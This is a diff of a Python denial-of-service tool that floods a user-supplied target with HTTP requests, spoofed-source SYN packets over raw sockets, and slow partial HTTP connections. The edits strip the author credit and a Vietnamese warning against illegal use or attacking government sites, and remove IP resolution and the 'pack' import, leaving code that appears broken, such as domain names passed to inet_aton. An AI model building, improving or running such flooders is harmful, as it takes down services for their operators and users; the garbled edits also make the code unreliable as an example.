@@ -3,23 +3,16 @@ import threading
 import time
 import requests
 from urllib.parse import urlparse
-from colorama import Fore, Style, init
+from colorama import Fore, Style
 from socket import *
 from random import randrange, choice
-from struct import pack, htons
 import re
 
-# Initialize colorama
-init(autoreset=True)
-
-print(Fore.MAGENTA + """
+print("""
 .-.   .-..-..----.  .---.  .----. .----.     .----..-----..-. .-..----. .-. .---.  
  \ \_/ / { || {_} }/ {-. \{ {__-`{ {__-`    { {__-``-' '-'| } { |} {-. \{ |/ {-. \ 
   \   /  | }| {_} }\ '-} /.-._} }.-._} }    .-._} }  } {  \ `-' /} '-} /| }\ '-} / 
    `-'   `-'`----'  `---' `----' `----'     `----'   `-'   `---' `----' `-' `---'  
-  AuThor: __VIBOSS__
-  Github: https://github.com/dhungx/ddos
-  ĐỪNG DÙNG MÃ NÀY GÂY PHẠM PHÁP VÀ QUAN TRỌNG HƠN LÀ ĐỪNG TẤN CÔNG WEB CHÍNH PHỦ
 """)
 
 class DDoSAttack:
@@ -28,10 +21,9 @@ class DDoSAttack:
         self.threads = threads
         self.attack_num = 0
         self.target_domain = urlparse(target_url).netloc
-        self.target_ip = self.get_ip_from_domain(self.target_domain)
 
     def start(self):
-        print(Fore.GREEN + f"Starting attack on {self.target_url}")
+        print(f"Starting attack on {self.target_url}")
         for _ in range(self.threads):
             thread = threading.Thread(target=self.run)
             thread.start()
@@ -54,9 +46,9 @@ class DDoSAttack:
         try:
             response = requests.get(self.target_url, headers=headers)
             self.attack_num += 1
-            print(Fore.GREEN + f"Requester packet sent! Attack count: {self.attack_num} - Response code: {response.status_code}")
+            print(Fore.GREEN + f"Requester packet sent! Attack count: {self.attack_num} - Response code: {response.status_code}" + Style.RESET_ALL)
         except requests.RequestException as e:
-            print(Fore.RED + f"Error: {e}")
+            print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
 
     def add_useragent(self):
         return [
@@ -74,24 +66,24 @@ class DDoSAttack:
 
             sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
             sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-            sock.sendto(packet, (self.target_ip, 0))
-            print(Fore.GREEN + "SYN Flood packet sent!")
+            sock.sendto(packet, (self.target_domain, 0))
+            print(Fore.GREEN + "SYN Flood packet sent!" + Style.RESET_ALL)
         except KeyboardInterrupt:
-            print(Fore.YELLOW + "SYN Flood stopped.")
+            print("SYN Flood stopped.")
         except Exception as e:
-            print(Fore.RED + f"Error in SYN Flood: {e}")
+            print(Fore.RED + f"Error in SYN Flood: {e}" + Style.RESET_ALL)
 
     def pyslow(self):
         try:
             sock = socket(AF_INET, SOCK_STREAM)
-            sock.connect((self.target_ip, 80))
+            sock.connect((self.target_domain, 80))
             sock.send(b'GET / HTTP/1.1\r\n')
             time.sleep(5)
-            print(Fore.GREEN + "Pyslow packet sent!")
+            print(Fore.GREEN + "Pyslow connection established!" + Style.RESET_ALL)
         except KeyboardInterrupt:
-            print(Fore.YELLOW + "Pyslow stopped.")
+            print("Pyslow stopped.")
         except Exception as e:
-            print(Fore.RED + f"Error in Pyslow: {e}")
+            print(Fore.RED + f"Error in Pyslow: {e}" + Style.RESET_ALL)
 
     def fake_ip(self):
         return '.'.join(str(randrange(256)) for _ in range(4))
@@ -107,7 +99,7 @@ class DDoSAttack:
         protocol = IPPROTO_TCP
         check = 10
         s_addr = inet_aton(self.fake_ip())
-        d_addr = inet_aton(self.target_ip)
+        d_addr = inet_aton(self.target_domain)
         ihl_version = (version << 4) + ihl
         return pack('!BBHHHBBH4s4s', ihl_version, tos, tot, id, frag_off, ttl, protocol, check, s_addr, d_addr)
 
@@ -118,22 +110,21 @@ class DDoSAttack:
         ack_seq = 0
         doff = 5
         tcp_flags = 1
-        window = htons(5840)
+        window = socket.htons(5840)
         check = 0
         urg_prt = 0
 
         offset_res = (doff << 4)
         return pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, check, urg_prt)
 
-    def get_ip_from_domain(self, domain):
-        try:
-            return gethostbyname(domain)
-        except gaierror as e:
-            print(Fore.RED + f"Error resolving domain {domain}: {e}")
-            return None
-
 def menu():
-    print(Fore.MAGENTA + Style.BRIGHT + "[INFORMATION!]" + Fore.WHITE + " Press CTRL + C and ENTER to exit!!")
+    print(Style.BRIGHT + Fore.MAGENTA + """
+.-.   .-..-..----.  .---.  .----. .----.     .----..-----..-. .-..----. .-. .---.  
+ \ \_/ / { || {_} }/ {-. \{ {__-`{ {__-`    { {__-``-' '-'| } { |} {-. \{ |/ {-. \ 
+  \   /  | }| {_} }\ '-} /.-._} }.-._} }    .-._} }  } {  \ `-' /} '-} /| }\ '-} / 
+   `-'   `-'`----'  `---' `----' `----'     `----'   `-'   `---' `----' `-' `---'  
+""" + Style.RESET_ALL)
+    print(Style.BRIGHT + Fore.YELLOW + "[INFORMATION!]" + Fore.WHITE + " Press CTRL + C and ENTER to exit!!")
     print(Fore.BLUE + Style.BRIGHT + "=====================>>>>>>>>>>>>>>>>")
     print(Fore.WHITE + Style.BRIGHT + "Please choose from the following options...")
     print(Fore.WHITE + Style.BRIGHT + "1. DDoS Requester [1]")
@@ -151,21 +142,21 @@ def menu():
         elif choice == 3:
             attack_type = 'pyslow'
         elif choice == 4:
-            print(Fore.YELLOW + "Exiting!")
+            print("Exiting!")
             return
         else:
-            print(Fore.RED + "Please select a valid option!")
+            print("Please select a valid option!")
             menu()
             return
         
         threads = int(input("Enter number of threads: "))
-        target_url = input(Fore.RED + Style.BRIGHT + "Enter target URL: ")
+        target_url = input(Fore.RED + Style.BRIGHT + "Enter target URL: " + Style.RESET_ALL)
 
         attack = DDoSAttack(target_url, threads)
         attack.start()
         
     except ValueError:
-        print(Fore.RED + "Please enter a valid number.")
+        print(Fore.RED + "Please enter a valid number." + Style.RESET_ALL)
         menu()
 
 if __name__ == "__main__":
